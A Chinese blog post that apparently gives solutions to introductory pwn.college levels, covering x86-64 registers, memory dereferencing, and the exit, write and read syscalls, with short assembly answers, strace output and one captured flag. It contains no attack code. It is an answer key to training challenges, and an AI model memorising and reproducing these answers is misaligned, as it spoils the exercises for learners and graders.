<!DOCTYPE html>
<html lang="zh">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Lobo Q1ng">


    <meta name="subtitle" content="天空是为蓝色~">




<title>pwn.college 题解 | Lobo Q1ng&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Q1ng&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Q1ng&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">pwn.college 题解</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Lobo Q1ng</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 1, 2025&nbsp;&nbsp;0:58:42</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Pwn/">Pwn</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Computing-101"><a href="#Computing-101" class="headerlink" title="Computing 101"></a>Computing 101</h2><h3 id="Your-First-Program"><a href="#Your-First-Program" class="headerlink" title="Your First Program"></a>Your First Program</h3><h4 id="1-Your-First-Register"><a href="#1-Your-First-Register" class="headerlink" title="1. Your First Register"></a>1. Your First Register</h4><p>这道题的要求是讲值60移动到<code>rax</code>寄存器中。并将汇编代码放进某个.s文件中</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">0x3c</span></span><br></pre></td></tr></table></figure>

<p>比较简单</p>
<h4 id="2-Your-First-Syscall"><a href="#2-Your-First-Syscall" class="headerlink" title="2. Your First Syscall"></a>2. Your First Syscall</h4><p>这道题通过将系统调用号为60传给eax，并执行系统调用指令<code>systemcall</code>，来调用exit</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h4 id="3-Exit-Codes"><a href="#3-Exit-Codes" class="headerlink" title="3. Exit Codes"></a>3. Exit Codes</h4><p>依然是调用指令，但是退出代码要求为42。42作为参数，那么系统调用的第一个参数通过rdi寄存器传递。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">42</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h4 id="4-Building-Executables"><a href="#4-Building-Executables" class="headerlink" title="4. Building Executables"></a>4. Building Executables</h4><p>要构建可执行二进制文件，步骤如下：</p>
<ol>
<li>将程序集写入文件（通常带有.s或.S语法）</li>
<li>将二进制文件汇编到可执行对象文件中（使用as命令）</li>
<li>将一个或多个可执行对象文件链接到最终的可执行二进制文件中（使用ld命令）</li>
</ol>
<p>使用Intel汇编语法，要让汇编者知道这一点。为此，再汇编代码的开头加上一个指令，如下所示（以上一个level的代码为例）。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">42</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>

<p><code>.intel_syntax noprefix</code>会告诉汇编器使用Intel汇编语法，特别是它的变体，从而不必为每个指令添加额外的前缀。</p>
<p>接下来分别使用as命令和ld命令来构建可执行二进制文件</p>
<p><code>as -o asm.o asm.s</code> 和 <code>ld -o exe asm.o</code>这将创建一个exe文件，随后可以运行该文件。</p>
<blockquote>
<p>ld命令：link editor</p>
<p>在典型的开发工作流程中，编译源代码并将汇编代码汇编成目标文件，通常有很多这样的文件（通常，程序中的每个源代码文件都编译成自己的目标文件）。然后，这些内容将<strong>链接</strong>在一起，形成一个可执行文件。即使只有一个文件我们仍然需要链接它，以准备最终的可执行文件。这是通过ld命令完成的。</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hacker@your-first-program~<span class="keyword">exit</span>-codes:~$ as -o hello.o hello.s</span><br><span class="line">hacker@your-first-program~<span class="keyword">exit</span>-codes:~$ ld -o exe hello.o</span><br><span class="line"><span class="regexp">/nix/</span>store<span class="regexp">/q3sm4x963a996qc3d6baw54609ryifak-binutils-2.41/</span>bin/ld: warning: cannot find entry symbol _start; defaulting to <span class="number">0000000000401000</span></span><br></pre></td></tr></table></figure>

<p>这里会有一个<code>_start</code>警告，这是因为ld会打印有关输入符号<code>_start</code>的警告。<code>_start</code>符号本质上是给ld的注释，说明在执行ELF时程序执行应该从何处开始。该警告指出，如果没有指定的<code>_start</code>，执行将从代码的开头开始。这对我们来说很好！</p>
<p>如果不希望出现这个警告，那么可以修改成：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">42</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>

<p>第二个<code>_start</code>标签指向代码的开头，第一个<code>.global _start</code>指示这个标签在链接器级别<strong>全局可见</strong>，而不仅仅是在对象文件级别本地可见。</p>
<h4 id="5-Tracing-Syscalls"><a href="#5-Tracing-Syscalls" class="headerlink" title="5. Tracing Syscalls"></a>5. Tracing Syscalls</h4><p>调试程序的工具和技术：<strong>strace</strong></p>
<p>用法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hacker@dojo:~$ strace /tmp/your-program</span><br><span class="line">execve(<span class="string">&quot;/tmp/your-program&quot;</span>, [<span class="string">&quot;/tmp/your-program&quot;</span>], 0x7ffd48ae28b0 /* 53 vars */) = 0</span><br><span class="line"><span class="built_in">exit</span>(42)                                 = ?</span><br><span class="line">+++ exited with 42 +++</span><br><span class="line">hacker@dojo:~$</span><br></pre></td></tr></table></figure>



<p>这道题的exp:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hacker@your-first-program~tracing-syscalls:~$ strace <span class="regexp">/challenge/</span>trace-me </span><br><span class="line">execve(<span class="string">&quot;/challenge/trace-me&quot;</span>, [<span class="string">&quot;/challenge/trace-me&quot;</span>], <span class="number">0</span>x7ffc5d085500 <span class="regexp">/* 26 vars */</span>) = <span class="number">0</span></span><br><span class="line">alarm(<span class="number">6398</span>)                             = <span class="number">0</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>)                                 = ?</span><br><span class="line">+++ exited with <span class="number">0</span> +++</span><br><span class="line">hacker@your-first-program~tracing-syscalls:~$ <span class="regexp">/challenge/</span>submit-number <span class="number">6398</span></span><br><span class="line">CORRECT! Here is your flag:</span><br><span class="line">pwn.college&#123;wHIzj1noGySkn_Bsyfc41LKkCc3.dFzN4UDLxYTN1YzW&#125;</span><br></pre></td></tr></table></figure>



<h4 id="6-Moving-Between-Registers"><a href="#6-Moving-Between-Registers" class="headerlink" title="6. Moving Between Registers"></a>6. Moving Between Registers</h4><p><code>rsi</code>寄存器，像<code>rdi</code>寄存器一样能存东西。</p>
<p>这道题要将rsi的值作为exit系统调用的代码</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsi</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h3 id="Computer-Memory"><a href="#Computer-Memory" class="headerlink" title="Computer Memory"></a>Computer Memory</h3><h4 id="1-Loading-From-Memory"><a href="#1-Loading-From-Memory" class="headerlink" title="1. Loading From Memory"></a>1. Loading From Memory</h4><p>从内存中加载数据</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="number">133700</span>]	# 从内存[<span class="number">0x133700</span>]处获得数据，存于<span class="built_in">rdi</span>寄存器中</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h4 id="2-More-Loading-Practice"><a href="#2-More-Loading-Practice" class="headerlink" title="2. More Loading Practice"></a>2. More Loading Practice</h4><p>同样的从内存中加载数据</p>
<h4 id="3-Dereferencing-Pointers"><a href="#3-Dereferencing-Pointers" class="headerlink" title="3. Dereferencing Pointers"></a>3. Dereferencing Pointers</h4><p>rax解引用，将rax存储的地址取出，并将这个地址所指向的值赋予rdi寄存器</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="built_in">rax</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h4 id="4-Dereferencing-Yourself"><a href="#4-Dereferencing-Yourself" class="headerlink" title="4. Dereferencing Yourself"></a>4. Dereferencing Yourself</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="built_in">rdi</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h4 id="5-Dereferencing-with-Offsets"><a href="#5-Dereferencing-with-Offsets" class="headerlink" title="5. Dereferencing with Offsets"></a>5. Dereferencing with Offsets</h4><p>说明：</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  Address │ Contents</span><br><span class="line">+────────────────────+</span><br><span class="line">│<span class="number"> 133700 </span> │<span class="number"> 50 </span>      │◂┐</span><br><span class="line">│<span class="number"> 133701 </span> │<span class="number"> 42 </span>      │ │</span><br><span class="line">│<span class="number"> 133702 </span> │<span class="number"> 99 </span>      │ │</span><br><span class="line">│<span class="number"> 133703 </span> │<span class="number"> 14 </span>      │ │</span><br><span class="line">+────────────────────+ │</span><br><span class="line">                       │</span><br><span class="line"> Register │ Contents   │</span><br><span class="line">+────────────────────+ │</span><br><span class="line">│ rdi     │<span class="number"> 133700 </span>  │─┘</span><br><span class="line">+────────────────────+</span><br></pre></td></tr></table></figure>

<p>如果我想获取42这个数字，那么可以：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, [<span class="built_in">rdi</span>+<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>最终的exp：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="built_in">rdi</span>+<span class="number">8</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h4 id="6-Stored-Address"><a href="#6-Stored-Address" class="headerlink" title="6. Stored Address"></a>6. Stored Address</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="number">567800</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="built_in">rdi</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h4 id="7-Double-Dereference"><a href="#7-Double-Dereference" class="headerlink" title="7. Double Dereference"></a>7. Double Dereference</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="built_in">rax</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="built_in">rdi</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h4 id="8-Triple-Dereference"><a href="#8-Triple-Dereference" class="headerlink" title="8. Triple Dereference"></a>8. Triple Dereference</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="built_in">rdi</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="built_in">rdi</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, [<span class="built_in">rdi</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h3 id="Hello-Hackers"><a href="#Hello-Hackers" class="headerlink" title="Hello Hackers"></a>Hello Hackers</h3><h4 id="1-Writing-Output"><a href="#1-Writing-Output" class="headerlink" title="1. Writing Output"></a>1. Writing Output</h4><p><code>write</code>系统调用的<code>syscall</code>编号为1。但是write系统调用还需要通过其参数指定要写入的数据以及将其写入的位置。</p>
<p><code>write</code>系统调用通过获取两个参数，即分别代表开始写入和要写入多少个字符。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">write</span><span class="params">(file_descriptor, memory_address, number_of_characters_to_write)</span></span></span><br></pre></td></tr></table></figure>

<p>其中，rdi寄存器传递系统调用的第一个参数。<strong>rsi寄存器传递第二个参数，rdx寄存器传递第三个参数。</strong></p>
<p>exp:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1337000</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h4 id="2-Chaining-Syscalls"><a href="#2-Chaining-Syscalls" class="headerlink" title="2. Chaining Syscalls"></a>2. Chaining Syscalls</h4><p>正确退出</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1337000</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">42</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>





<h4 id="3-Writing-Strings"><a href="#3-Writing-Strings" class="headerlink" title="3. Writing Strings"></a>3. Writing Strings</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1337000</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">14</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">42</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h4 id="4-Reading-Data"><a href="#4-Reading-Data" class="headerlink" title="4. Reading Data"></a>4. Reading Data</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1337000</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">8</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="number">1337000</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">8</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">42</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>



<h3 id="Assembly-Crash-Course"><a href="#Assembly-Crash-Course" class="headerlink" title="Assembly Crash Course"></a>Assembly Crash Course</h3><h4 id="1-set-register"><a href="#1-set-register" class="headerlink" title="1. set-register"></a>1. set-register</h4><p>要求：<code>rdi = 0x1337</code></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">0x1337</span></span><br></pre></td></tr></table></figure>



<h4 id="2-set-multiple-registers"><a href="#2-set-multiple-registers" class="headerlink" title="2. set-multiple-registers"></a>2. set-multiple-registers</h4><p>In this level, you will work with multiple registers. Please set the following:</p>
<ul>
<li><code>rax = 0x1337</code></li>
<li><code>r12 = 0xCAFED00D1337BEEF</code></li>
<li><code>rsp = 0x31337</code></li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x1337</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">r12</span>, <span class="number">0xCAFED00D1337BEEF</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rsp</span>, <span class="number">0x31337</span></span><br></pre></td></tr></table></figure>



<h4 id="3-add-to-register"><a href="#3-add-to-register" class="headerlink" title="3. add-to-register"></a>3. add-to-register</h4><p>Do the following:</p>
<ul>
<li>Add <code>0x331337</code> to <code>rdi</code></li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">rdi</span>, <span class="number">0x331337</span></span><br></pre></td></tr></table></figure>



